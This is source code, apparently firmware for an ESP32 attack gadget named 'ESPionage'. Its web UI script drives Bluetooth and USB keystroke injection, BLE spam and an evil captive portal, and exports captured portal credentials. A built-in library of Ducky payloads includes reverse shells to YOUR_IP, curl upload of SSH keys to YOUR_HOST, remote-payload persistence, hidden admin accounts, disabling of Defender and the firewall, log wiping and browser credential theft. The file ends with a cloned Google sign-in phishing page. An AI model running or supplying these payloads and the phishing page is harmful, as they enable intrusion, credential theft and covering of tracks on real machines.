    await bleHidPost({ type: 'mouse', interval });
    bleHidJiggling = true;
  }
  updateBleJigglerBtn();
}

function updateBleJigglerBtn() {
  const btn = document.getElementById('ble-jiggle-btn');
  if (btn) btn.innerHTML = bleHidJiggling ? '\u23F9 Stop jiggler' : '\u{1F680} Start jiggler';
}

async function refreshBleHidStatus() {
  try {
    const r = await fetch('/api/ble-hid-status');
    const d = await r.json();
    const adv  = d.advertising;
    const conn = d.connected;
    const jig  = d.jiggling;
    const hid  = d.hidRunning;
    const name = d.name || 'ESPionage KB';
    bleHidJiggling = !!jig;
    updateBleJigglerBtn();
    // Sync name field if device is active (preserves user's choice across refresh)
    const nameEl = document.getElementById('ble-hid-name');
    if (nameEl && (adv || conn)) nameEl.value = name;
    const el = document.getElementById('ble-hid-status');
    if (!el) return;
    if (conn)      el.innerHTML = '\u{1F7E2} Connected as \u201c' + name + '\u201d' + (hid ? ' \u2014 HID active' : '') + (jig ? ' \u2014 jiggling' : '');
    else if (adv)  el.innerHTML = '\u{1F7E1} Advertising as \u201c' + name + '\u201d \u2014 open Bluetooth on target to pair';
    else           el.innerHTML = '\u25CF Not started';
  } catch(e) {}
}
// BLE HID status is now updated via pollState() — no separate interval

// ── Conflict / exclusion system ──────────────────────────────────────────────
// Tracks which features are mutually exclusive and warns the user.
// Conflict groups:
//   "ble"   — BLE radio: scanning, spam, custom adv, airtag, BLE finder, BLE HID
//   "wifi"  — WiFi AP: evil portal, rogue AP (both host an AP on the same radio)
//
// The home tab's mode banner always shows current mode number.
// We poll /api/mode every 3s and map mode → conflict group.

const MODE_CONFLICT_MAP = {
  2:  { group: 'ble',  label: 'BLE Scan' },
  4:  { group: 'ble',  label: 'Apple BLE Spam' },
  5:  { group: 'ble',  label: 'Google BLE Spam' },
  6:  { group: 'ble',  label: 'Samsung BLE Spam' },
  7:  { group: 'ble',  label: 'Windows BLE Spam' },
  11: { group: 'ble',  label: 'AirTag Detector' },
  13: { group: 'ble',  label: 'BLE Finder' },
  14: { group: 'ble',  label: 'BLE Spam (mix)' },
  15: { group: 'ble',  label: 'Custom BLE Advertiser' },
  19: { group: 'ble',  label: 'AirTag Emulation' },
  9:  { group: 'wifi', label: 'Evil Portal' },
  16: { group: 'wifi', label: 'Rogue AP' },
};

const CONFLICT_MSGS = {
  ble: (active) =>
    `⚠ ${active} is using the BLE radio — stop it before starting BLE HID (they share the same stack).`,
  wifi: (active) =>
    `⚠ ${active} is hosting a WiFi network — tabs that scan or connect to other networks won't work correctly. Stop it to use normal WiFi features.`,
};

const TAB_CONFLICT_GROUPS = {
  wifi:      [],               // wifi tab never conflicts with itself
  ble:       ['ble'],          // BLE tab features conflict with BLE HID
  broadcast: [],
  portal:    [],
  usb:       [],
  system:    [],
};

let _currentServerMode = 0;
let _bleHidActive = false;

// ── Unified poll — single /api/poll request replaces mode+bleHid+usb fetches ─
async function pollState() {
  try {
    const r = await fetch('/api/poll');
    const d = await r.json();

    // Mode / conflicts
    _currentServerMode = d.mode || 0;

    // BLE HID status
    const bd = d.bleHid || {};
    _bleHidActive = !!(bd.advertising || bd.connected || bd.jiggling || bd.hidRunning);
    bleHidJiggling = !!bd.jiggling;
    updateBleJigglerBtn();
    const adv = bd.advertising, conn = bd.connected, jig = bd.jiggling, hid = bd.hidRunning;
    const bName = bd.name || 'ESPionage KB';
    const nameEl = document.getElementById('ble-hid-name');
    if (nameEl && (adv || conn)) nameEl.value = bName;
    const statusEl = document.getElementById('ble-hid-status');
    if (statusEl) {
      if (conn)     statusEl.innerHTML = '\u{1F7E2} Connected as \u201c' + bName + '\u201d' + (hid ? ' \u2014 HID active' : '') + (jig ? ' \u2014 jiggling' : '');
      else if (adv) statusEl.innerHTML = '\u{1F7E1} Advertising as \u201c' + bName + '\u201d \u2014 open Bluetooth on target to pair';
      else          statusEl.innerHTML = '\u25CF Not started';
    }

    // USB status
    const ud = d.usb || {};
    usbJiggling  = !!ud.jiggling;
    usbHidActive = !!ud.hidRunning;
    const mb = document.getElementById('usb-mouse-btn');
    if (mb) mb.innerHTML = usbJiggling ? '\u23F9 Stop jiggler' : '\u25B6 Start jiggler';
    const ss = document.getElementById('usb-spoof-status');
    if (ss && ud.vid) ss.textContent = `Active: ${ud.product || 'HID Device'} (${ud.vid}:${ud.pid})`;
    const ms = document.getElementById('usb-storage-status');
    if (ms) ms.textContent = ud.mscActive ? '\uD83D\uDFE2 RAM disk mounted \u2014 512 KB visible to host' : '\u25CF Not mounted';

    updateConflictBanner();
  } catch(e) {}
}

// pollConflicts() kept as thin alias so conflictStop() still works
function pollConflicts() { return pollState(); }

// refreshBleHidStatus / refreshUsbStatus: kept as aliases for action callbacks
function refreshBleHidStatus() { return pollState(); }
function refreshUsbStatus()    { return pollState(); }

function updateConflictBanner() {
  const banner = document.getElementById('conflict-banner');
  const msgEl  = document.getElementById('conflict-msg');
  if (!banner || !msgEl) return;

  // Determine what's currently running
  const modeInfo = MODE_CONFLICT_MAP[_currentServerMode];
  let msg = null;

  // Check: BLE HID active + any BLE mode running
  if (_bleHidActive && modeInfo && modeInfo.group === 'ble') {
    msg = `⚠ BLE HID is active AND ${modeInfo.label} is running — they share the BLE radio. Stop one of them.`;
  }
  // Check: which tab we're on and whether there's a relevant conflict
  const activeTab = document.querySelector('nav button.active')?.dataset.tab;
  if (!msg && activeTab === 'wifi' && modeInfo && modeInfo.group === 'wifi') {
    msg = `⚠ ${modeInfo.label} is hosting a network — WiFi scanning won\u2019t show real networks while it\u2019s running. ` +
          `Go to the Portal tab to stop it.`;
  }
  if (!msg && activeTab === 'ble' && _bleHidActive && modeInfo && modeInfo.group === 'ble') {
    msg = `⚠ BLE HID is active AND ${modeInfo.label} is running \u2014 stop one before using the other.`;
  }
  // Always show if wifi AP mode is on and user is on WiFi tab trying to scan
  if (!msg && activeTab === 'wifi' && modeInfo && modeInfo.group === 'wifi') {
    msg = CONFLICT_MSGS.wifi(modeInfo.label);
  }

  if (msg) {
    msgEl.textContent = msg;
    banner.style.display = 'flex'; banner.style.alignItems = 'center';
    // Store what to stop when user clicks the button
    banner.dataset.conflictMode = _currentServerMode;
    banner.dataset.conflictBleHid = _bleHidActive && modeInfo && modeInfo.group === 'ble' ? '1' : '0';
  } else {
    banner.style.display = 'none';
  }
}

async function conflictStop() {
  const banner = document.getElementById('conflict-banner');
  // Stop the server mode if it's conflicting
  const cm = parseInt(banner?.dataset.conflictMode || '0');
  if (cm !== 0) await fetch('/api/mode', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({mode:0}) });
  // Stop BLE HID if it's conflicting
  if (banner?.dataset.conflictBleHid === '1') await bleHidStop();
  banner.style.display = 'none';
  // Refresh
  setTimeout(pollConflicts, 500);
}

// Re-check conflicts whenever the user switches tabs (some conflicts are tab-specific)
document.querySelectorAll('nav button[data-tab]').forEach(btn => {
  btn.addEventListener('click', () => setTimeout(updateConflictBanner, 100));
});

// Single unified poll interval replaces separate refreshUsbStatus/refreshBleHidStatus/pollConflicts
// intervals — fires once every 2.5s instead of 3 separate timers hitting the server simultaneously
setInterval(pollState, 2500);
// pollState() is called from initPage() at bottom — not directly here
// ── end conflict system ───────────────────────────────────────────────────────

// BLE HID preset loader (reuses DUCKY_SCRIPTS map from usb tab)
function loadBleHid(key) {
  const ta = document.getElementById('ble-hid-payload');
  if (!ta) return;
  if (DUCKY_SCRIPTS && DUCKY_SCRIPTS[key]) ta.value = DUCKY_SCRIPTS[key];
  else if (key === 'hello') ta.value = 'STRING Hello from ESPionage!\nENTER';
  ta.scrollIntoView({ block: 'nearest' });
}
// ── end BLE HID ──────────────────────────────────────────────────────────────

// Hide Ducky preset buttons that don't match the current target OS.
function applyOsFilterToPresets(os) {
  document.querySelectorAll('#ducky-scene-grid .scene').forEach(btn => {
    const plats = (btn.getAttribute('data-platforms') || 'windows,mac').split(',');
    btn.style.display = plats.includes(os) ? '' : 'none';
  });
  // Update lock screen description per-OS so it doesn't say "WIN+L" on mac.
  const lsd = document.getElementById('lock-screen-desc');
  if (lsd) lsd.textContent = os === 'mac'
    ? 'Instantly locks the Mac (CTRL+\u2318+Q).'
    : 'Instantly locks the workstation (WIN+L).';
}

async function usbAction(type) {
  if (!usbCapable || !usbHostConnected) {
    alert('ESPionage USB port must be plugged into the target machine first.');
    return;
  }
  if (type === 'rndis' && targetOs === 'mac') {
    if (!confirm('RNDIS is Windows-only. macOS uses a different protocol (CDC-ECM) that isn\u2019t currently supported. Try anyway?')) return;
  }
  const body = { type, os: targetOs };
  if (type === 'hid') {
    body.payload = document.getElementById('usb-payload').value;
    body.loop    = document.getElementById('usb-loop').checked;
  }
  if (type === 'mouse') body.interval = parseInt(document.getElementById('usb-jiggle-interval').value) || 30;
  if (type === 'spoof') { body.vid = document.getElementById('usb-vid').value; body.pid = document.getElementById('usb-pid').value; }
  const statusEl = document.getElementById('usb-' + type + '-status') || document.getElementById('usb-hid-status');
  if (statusEl) statusEl.textContent = 'Sending\u2026';
  try {
    const res = await fetch('/api/usb', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
    const data = await res.json();
    if (statusEl) statusEl.textContent = data.ok ? '\u2705 Sent' : ('\u274C ' + (data.note || 'error'));
    setTimeout(() => { if (statusEl) statusEl.textContent = '\u2014'; }, 3000);
  } catch(e) { if (statusEl) statusEl.textContent = '\u274C Network error'; }
}

function setSpoofId(vid, pid) {
  document.getElementById('usb-vid').value = vid;
  document.getElementById('usb-pid').value = pid;
}
function usbSpoofReset() {
  // Reset to default Apple Wireless Keyboard VID/PID
  document.getElementById('usb-vid').value = '05AC';
  document.getElementById('usb-pid').value = '0267';
  usbAction('spoof');
}

// OS-specific Ducky scripts.  Each key has { windows, mac } variants.
const DUCKY_SCRIPTS = {
  reverse_shell: {
    windows:
`REM Reverse shell \u2014 edit YOUR_IP/PORT before running
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}"
ENTER`,
    mac:
`REM Bash reverse shell \u2014 edit YOUR_IP/PORT before running
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
ENTER`
  },
  exfil_wifi: {
    windows:
`REM Dump saved WiFi passwords to Desktop
DELAY 1000
GUI r
DELAY 500
STRING cmd /k netsh wlan export profile folder="%USERPROFILE%\\Desktop" key=clear && exit
ENTER`,
    mac:
`REM List preferred wireless networks (passwords need Keychain auth)
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING networksetup -listpreferredwirelessnetworks en0 > ~/Desktop/wifi_networks.txt && open ~/Desktop/wifi_networks.txt
ENTER`
  },
  add_user: {
    windows:
`REM Add hidden admin user \u2014 change name/pass first
DELAY 1000
GUI r
DELAY 500
STRING cmd /k net user espionage P@ssw0rd! /add && net localgroup administrators espionage /add && exit
ENTER`,
    mac:
`REM Add admin user (requires existing admin session)
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING sudo dscl . -create /Users/espionage && sudo dscl . -create /Users/espionage UserShell /bin/zsh && sudo dscl . -passwd /Users/espionage P@ssw0rd && sudo dscl . -append /Groups/admin GroupMembership espionage
ENTER`
  },
  disable_defender: {
    windows:
`REM Disable Windows Defender real-time protection (admin required)
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden Set-MpPreference -DisableRealtimeMonitoring $true
ENTER`,
    mac:
`REM Disable Gatekeeper \u2014 allows unsigned apps (admin required)
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING sudo spctl --master-disable
ENTER`
  },
  open_rickroll: {
    windows:
`REM Rickroll via Run dialog
DELAY 500
GUI r
DELAY 400
STRING https://www.youtube.com/watch?v=2qBlE2-WL60
ENTER`,
    mac:
`REM Rickroll via Spotlight
DELAY 500
GUI SPACE
DELAY 500
STRING https://www.youtube.com/watch?v=2qBlE2-WL60
ENTER`
  },
  lock_screen: {
    windows:
`REM Lock screen instantly
GUI l`,
    mac:
`REM Lock screen (macOS 10.13+)
CTRL GUI q`
  },

  // -------------------- Expanded library --------------------

  disable_firewall: {
    windows:
`REM Kill Windows Firewall (all profiles). Requires admin.
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -Verb RunAs -Command "Start-Process cmd -ArgumentList '/c netsh advfirewall set allprofiles state off' -Verb RunAs"
ENTER`,
    mac:
`REM Disable application firewall (requires admin)
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
ENTER`
  },

  enable_remote: {
    windows:
`REM Enable RDP + open port 3389. Requires admin.
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -Verb RunAs -Command "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
ENTER`,
    mac:
`REM Enable SSH (Remote Login). Requires admin.
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING sudo systemsetup -setremotelogin on
ENTER`
  },

  change_dns: {
    windows:
`REM Hijack DNS on the primary interface. Edit the IPs first!
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -Verb RunAs -Command "Get-NetAdapter | Where-Object Status -eq 'Up' | Set-DnsClientServerAddress -ServerAddresses ('8.8.8.8','1.1.1.1')"
ENTER`,
    mac:
`REM Point Wi-Fi DNS at attacker resolver. Requires admin.
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING sudo networksetup -setdnsservers Wi-Fi 8.8.8.8 1.1.1.1
ENTER`
  },

  persistence: {
    windows:
`REM Registry Run-key persistence. Edit PAYLOAD_URL first.
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -Command "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdater' -Value 'powershell -w hidden -c iwr PAYLOAD_URL | iex' -PropertyType String -Force"
ENTER`,
    mac:
`REM LaunchAgent persistence that runs PAYLOAD_URL every login
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING mkdir -p ~/Library/LaunchAgents && printf '%s\\n' '<?xml version="1.0" encoding="UTF-8"?>' '<plist version="1.0"><dict>' '<key>Label</key><string>com.apple.systemupdater</string>' '<key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>curl -s PAYLOAD_URL | bash</string></array>' '<key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.apple.systemupdater.plist && launchctl load ~/Library/LaunchAgents/com.apple.systemupdater.plist
ENTER`
  },

  clear_logs: {
    windows:
`REM Wipe all Windows event logs. Requires admin.
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -Verb RunAs -Command "wevtutil el | ForEach-Object { wevtutil cl \\\"$_\\\" }"
ENTER`,
    mac:
`REM Clear shell history + system logs (current user)
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING history -c ; rm -f ~/.bash_history ~/.zsh_history ~/.zsh_sessions/* ; sudo log erase --all
ENTER`
  },

  exfil_ssh_keys: {
    windows:
`REM Grab stored SSH keys on Windows (if any)
DELAY 1000
GUI r
DELAY 500
STRING cmd /k copy %USERPROFILE%\\.ssh\\* %USERPROFILE%\\Desktop\\ssh_backup\\ /Y
ENTER`,
    mac:
`REM Copy ~/.ssh to /tmp and POST to attacker server. Edit YOUR_HOST.
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING tar -czf /tmp/ssh.tgz -C ~ .ssh && curl -F "f=@/tmp/ssh.tgz" https://YOUR_HOST/upload
ENTER`
  },

  browser_creds: {
    windows:
`REM Copy Chrome's Login Data + Local State to Desktop. Decryption needs DPAPI on same user.
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -Command "Copy-Item \\\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\\\" \\\"$env:USERPROFILE\\Desktop\\chrome_logins.db\\\"; Copy-Item \\\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State\\\" \\\"$env:USERPROFILE\\Desktop\\chrome_state.json\\\""
ENTER`,
    mac:
`REM Copy Chrome cookies/login data on Mac
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING cp "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" ~/Desktop/chrome_logins.db 2>/dev/null; cp "$HOME/Library/Application Support/Google/Chrome/Default/Cookies" ~/Desktop/chrome_cookies.db 2>/dev/null
ENTER`
  },

  screenshot: {
    windows:
`REM Screenshot desktop to Pictures\\shot.png
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object Drawing.Bitmap $b.Width,$b.Height; $g=[Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size); $bmp.Save(\\\"$env:USERPROFILE\\Pictures\\shot.png\\\")"
ENTER`,
    mac:
`REM Screenshot entire desktop to ~/Desktop
DELAY 1000
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1800
STRING screencapture -x ~/Desktop/shot.png
ENTER`
  },

  speak_text: {
    windows:
`REM Make the PC say something creepy
DELAY 800
GUI r
DELAY 500
STRING powershell -w hidden -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('I can see what you are doing')"
ENTER`,
    mac:
`REM Mac 'say' command
DELAY 800
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1500
STRING say "I can see what you are doing"
ENTER`
  },

  open_many_tabs: {
    windows:
`REM Open 10 different annoying tabs
DELAY 800
GUI r
DELAY 400
STRING powershell -w hidden -c "$u='https://hackertyper.net/','https://theuselessweb.com/','https://cat-bounce.com/','https://pointerpointer.com/','https://staggeringbeauty.com/','https://orteil.dashnet.org/cookieclicker/','https://windows93.net/','https://neal.fun/infinite-craft/','https://www.rrrgggbbb.com/','https://iamawesome.com/'; $u|%{start-process $_;sleep 0.4}"
ENTER`,
    mac:
`REM Open 10 different annoying tabs
DELAY 800
GUI SPACE
DELAY 500
STRING Terminal
ENTER
DELAY 1500
STRING for u in https://hackertyper.net/ https://theuselessweb.com/ https://cat-bounce.com/ https://pointerpointer.com/ https://staggeringbeauty.com/ https://orteil.dashnet.org/cookieclicker/ https://windows93.net/ https://neal.fun/infinite-craft/ https://www.rrrgggbbb.com/ https://iamawesome.com/; do open "$u"; sleep 0.3; done
ENTER`
  },

  fake_bsod: {
    windows:
`REM Fullscreen fake Windows update (harmless prank). Press F11 manually.
DELAY 800
GUI r
DELAY 400
STRING https://fakeupdate.net/win10/
ENTER
DELAY 3000
STRING
REM (press F11 manually to go fullscreen)`,
    mac:
`REM Fake update screen in browser
DELAY 800
GUI SPACE
DELAY 400
STRING https://fakeupdate.net/mac/
ENTER`
  },

  flip_screen: {
    windows:
`REM Invert display colors (accessibility shortcut, all Windows versions)
CTRL ALT DOWN`,
    mac:
`REM Invert all display colors — instant, reversible, works on any Mac
CTRL OPTION CMD 8`
  },
};

function loadDucky(key) {
  const entry = DUCKY_SCRIPTS[key];
  if (!entry) return;
  currentDuckyKey = key;
  document.getElementById('usb-payload').value = entry[targetOs] || entry.windows;
  // Scroll just enough to show the textarea, without jumping the whole card to top
  document.getElementById('usb-payload').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// -------- Export helpers --------
function dlFile(filename, content) {
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([content], { type: 'text/plain' }));
  a.download = filename;
  a.click();
  setTimeout(() => URL.revokeObjectURL(a.href), 5000);
}

async function exportWifi() {
  try {
    const data = await fetch('/api/wifi').then(r => r.json());
    if (!data.length) { alert('No WiFi data to export — run a scan first.'); return; }
    const lines = ['SSID,BSSID,Channel,Encryption,RSSI_dBm'];
    data.sort((a,b) => b.rssi - a.rssi)
        .forEach(ap => lines.push(`"${(ap.ssid||'<hidden>').replace(/"/g,'""')}",${ap.bssid},${ap.ch},${encName(ap.enc)},${ap.rssi}`));
    dlFile('wifi_scan_' + datestamp() + '.csv', lines.join('\n'));
  } catch(e) { alert('Export failed: ' + e); }
}

async function exportBle() {
  try {
    const data = await fetch('/api/ble').then(r => r.json());
    if (!data.length) { alert('No BLE data to export — run a scan first.'); return; }
    const lines = ['Name,MAC,Manufacturer,RSSI_dBm'];
    data.sort((a,b) => b.rssi - a.rssi)
        .forEach(d => lines.push(`"${(d.name||'(unnamed)').replace(/"/g,'""')}",${d.mac},"${(d.manuf||'unknown').replace(/"/g,'""')}",${d.rssi}`));
    dlFile('ble_scan_' + datestamp() + '.csv', lines.join('\n'));
  } catch(e) { alert('Export failed: ' + e); }
}

async function exportProbes() {
  try {
    const raw = await fetch('/api/probes').then(r => r.json());
    if (!raw.length) { alert('No probe data to export — run the probe sniffer first.'); return; }
    const devices = {};
    raw.forEach(p => {
      if (!devices[p.mac]) devices[p.mac] = { mac: p.mac, rssi: p.rssi, ssids: new Set() };
      if (p.ssid) devices[p.mac].ssids.add(p.ssid);
      if (p.rssi > devices[p.mac].rssi) devices[p.mac].rssi = p.rssi;
    });
    const lines = ['MAC,RSSI_dBm,Remembered_Networks'];
    Object.values(devices).sort((a,b) => b.rssi - a.rssi)
      .forEach(d => lines.push(`${d.mac},${d.rssi},"${[...d.ssids].join(' | ')}"`));
    dlFile('probes_' + datestamp() + '.csv', lines.join('\n'));
  } catch(e) { alert('Export failed: ' + e); }
}

async function exportCreds() {
  try {
    const data = await fetch('/api/portal/creds').then(r => r.json());
    if (!data.length) { alert('No credentials captured yet.'); return; }
    const lines = ['Username,Password,Template,Seconds_Uptime'];
    data.forEach(c => lines.push(`"${(c.user||'').replace(/"/g,'""')}","${(c.pass||'').replace(/"/g,'""')}",${c.tmpl||''},${c.ts}`));
    dlFile('portal_creds_' + datestamp() + '.csv', lines.join('\n'));
  } catch(e) { alert('Export failed: ' + e); }
}

async function exportActivity() {
  try {
    const data = await fetch('/api/activity').then(r => r.json());
    if (!data.length) { alert('No activity logged yet.'); return; }
    const lines = data.map(e => `[${e.type.toUpperCase().padEnd(5)}] t+${String(e.ts).padStart(6)}s  ${e.msg}`);
    dlFile('activity_' + datestamp() + '.txt', lines.join('\n'));
  } catch(e) { alert('Export failed: ' + e); }
}

function datestamp() {
  const d = new Date();
  return `${d.getFullYear()}${String(d.getMonth()+1).padStart(2,'0')}${String(d.getDate()).padStart(2,'0')}_${String(d.getHours()).padStart(2,'0')}${String(d.getMinutes()).padStart(2,'0')}`;
}

// -------- Helpers --------
function emptyItem(msg) { return `<div class="list-item"><div class="l"><div class="name">${esc(msg)}</div></div></div>`; }
function esc(s) { return (s+'').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
function fmtTime(s) {
  s = s|0; if (s < 60) return s+'s';
  const m = s/60|0; if (m < 60) return m+'m';
  const h = m/60|0; return h+'h '+(m%60)+'m';
}
function rssiClass(r) { if (r > -60) return 'strong'; if (r < -80) return 'weak'; return ''; }
function encName(e) {
  return {0:'open',1:'WEP',2:'WPA',3:'WPA2',4:'WPA2+WPA',5:'WPA2 Ent',6:'WPA3',7:'WPA2+WPA3'}[e] || ('t'+e);
}

// ── Sequential page-load init ─────────────────────────────────────────────────
// Fires requests one-at-a-time instead of 6 simultaneously, preventing
// AsyncTCP connection pool exhaustion that caused the device to hang on reload.
async function initPage() {
  await loadInfo();       // /api/info  — chip info, AP settings
  await pollState();      // /api/poll  — mode + bleHid + usb in one shot
  await ajInit();         // /api/apple-devices  — pre-cached, fast
  refreshActivity();      // /api/activity  — non-critical, fire last (no await)
}
initPage();
)JS";

// ---- Evil portal login pages ------------------------------------------------
// Served at /portal-login?t=<template>
// Credentials POSTed to /portal-submit

static const char PORTAL_GOOGLE[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:16px}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%}
.logo{text-align:center;margin-bottom:26px}
.logo svg{width:75px;height:24px}
h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:8px}
.sub{font-size:16px;color:#202124;text-align:center;margin-bottom:32px}
.field{position:relative;margin-bottom:28px}
.field input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;color:#202124;background:transparent;transition:border-color .2s}
.field input:focus{border-color:#1a73e8;border-width:2px}
.field label{position:absolute;left:13px;top:14px;color:#80868b;font-size:16px;pointer-events:none;transition:.15s ease;background:#fff;padding:0 2px}
.field input:focus~label,.field input:not(:placeholder-shown)~label{top:-9px;font-size:11px;color:#1a73e8}
.field input:focus~label{color:#1a73e8}
.field input:not(:focus):not(:placeholder-shown)~label{color:#5f6368}
.forgot{color:#1a73e8;font-size:14px;text-decoration:none;display:block;margin:-12px 0 28px}
.actions{display:flex;justify-content:space-between;align-items:center}
.create{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}
.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px}
.next:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.3)}
#step2{display:none}
.step-hint{font-size:14px;color:#202124;text-align:center;margin-bottom:24px;display:flex;align-items:center;justify-content:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:8px 16px;width:fit-content;margin:0 auto 28px}
.step-hint svg{width:18px;height:18px}
.footer{margin-top:20px;display:flex;justify-content:space-between;font-size:12px;color:#70757a}
.footer a{color:#70757a;text-decoration:none}
</style></head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><path d="M29.888 12.288c0 3.264-2.552 5.672-5.688 5.672s-5.688-2.408-5.688-5.672 2.552-5.672 5.688-5.672 5.688 2.408 5.688 5.672zm-2.492 0c0-2.04-1.48-3.44-3.196-3.44s-3.196 1.4-3.196 3.44 1.48 3.44 3.196 3.44 3.196-1.4 3.196-3.44z" fill="#EA4335"/><path d="M42.328 12.288c0 3.264-2.552 5.672-5.688 5.672s-5.688-2.408-5.688-5.672 2.552-5.672 5.688-5.672 5.688 2.408 5.688 5.672zm-2.492 0c0-2.04-1.48-3.44-3.196-3.44s-3.196 1.4-3.196 3.44 1.48 3.44 3.196 3.44 3.196-1.4 3.196-3.44z" fill="#FBBC05"/><path d="M54.32 6.9v9.864c0 4.064-2.396 5.728-5.228 5.728-2.668 0-4.272-1.784-4.876-3.244l2.168-.904c.376.9 1.292 1.96 2.712 1.96 1.772 0 2.872-1.096 2.872-3.156v-.772h-.088c-.528.652-1.548 1.22-2.836 1.22-2.692 0-5.16-2.348-5.16-5.644 0-3.32 2.468-5.692 5.16-5.692 1.284 0 2.304.576 2.836 1.208h.088V6.9h2.352zm-2.18 5.412c0-2.016-1.344-3.488-3.056-3.488-1.736 0-3.192 1.472-3.192 3.488 0 2 1.456 3.452 3.192 3.452 1.712 0 3.056-1.452 3.056-3.452z" fill="#4285F4"/><path d="M58.804 1.252v16.5h-2.432V1.252h2.432z" fill="#34A853"/><path d="M68.26 14.136l1.936 1.292c-.624.924-2.132 2.516-4.736 2.516-3.228 0-5.636-2.492-5.636-5.672 0-3.376 2.424-5.672 5.36-5.672 2.956 0 4.404 2.34 4.876 3.604l.26.648-7.596 3.144c.58 1.14 1.484 1.72 2.756 1.72 1.276 0 2.16-.628 2.78-1.58zm-5.964-2.048l5.08-2.108c-.28-.708-1.12-1.204-2.112-1.204-1.268 0-3.036 1.12-2.968 3.312z" fill="#EA4335"/><path d="M9.512 10.628V8.18h8.12c.08.42.12.916.12 1.452 0 1.808-.496 4.044-2.092 5.64-1.552 1.616-3.54 2.484-6.144 2.484C4.7 17.756.8 13.988.8 9.168S4.7.58 9.516.58c2.672 0 4.58 1.048 6.008 2.412l-1.692 1.692c-1.024-.96-2.412-1.708-4.316-1.708-3.528 0-6.284 2.84-6.284 6.192s2.756 6.192 6.284 6.192c2.288 0 3.592-.92 4.428-1.756.676-.676 1.12-1.644 1.296-2.968l-5.728-.008z" fill="#4285F4"/></svg>
  </div>
  <div id="step1">
    <h1>Sign in</h1>
    <p class="sub">Use your Google Account</p>
    <div class="field">
      <input type="email" id="email-input" placeholder=" " autofocus>
      <label for="email-input">Email or phone</label>
    </div>
    <a href="#" class="forgot">Forgot email?</a>
    <div class="actions">
      <a href="#" class="create">Create account</a>
